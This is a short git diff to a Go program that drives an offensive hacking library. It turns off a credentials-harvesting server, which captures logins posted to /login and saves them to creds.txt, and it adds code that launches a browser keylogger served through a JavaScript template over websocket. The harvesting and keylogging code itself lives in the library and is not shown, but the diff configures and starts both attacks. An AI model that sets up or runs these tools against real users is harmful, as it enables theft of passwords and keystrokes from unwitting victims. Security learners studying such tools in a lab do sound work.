@@ -1,6 +1,8 @@
 package main
 
-import "github.com/dmdhrumilmistry/gohtools/http"
+import (
+	"github.com/dmdhrumilmistry/gohtools/http"
+)
 
 func main() {
 
@@ -85,11 +87,19 @@ func main() {
 	// http.ListenAndServe("0.0.0.0:8000", n)
 
 	// Start Creds harvesting server
-	filePath := "creds.txt"
-	port := 8000
-	captureUri := "/login"
-	serverRootPath := "public"
-	credsHarvestingServ := http.NewLoginHarvest(filePath, port, captureUri, serverRootPath)
-	credsHarvestingServ.StartHarvesting()
+	// filePath := "creds.txt"
+	// port := 8000
+	// captureUri := "/login"
+	// serverRootPath := "public"
+	// credsHarvestingServ := http.NewLoginHarvest(filePath, port, captureUri, serverRootPath)
+	// credsHarvestingServ.StartHarvesting()
+
+	// KeyLogger
+	listenAddr := "localhost:8080"
+	wsAddr := listenAddr
+	jsTemplateFilePath := "logger.js"
+	keyLogger := http.NewKeyLogger(listenAddr, wsAddr, jsTemplateFilePath)
+
+	keyLogger.StartLogger()
 
 }
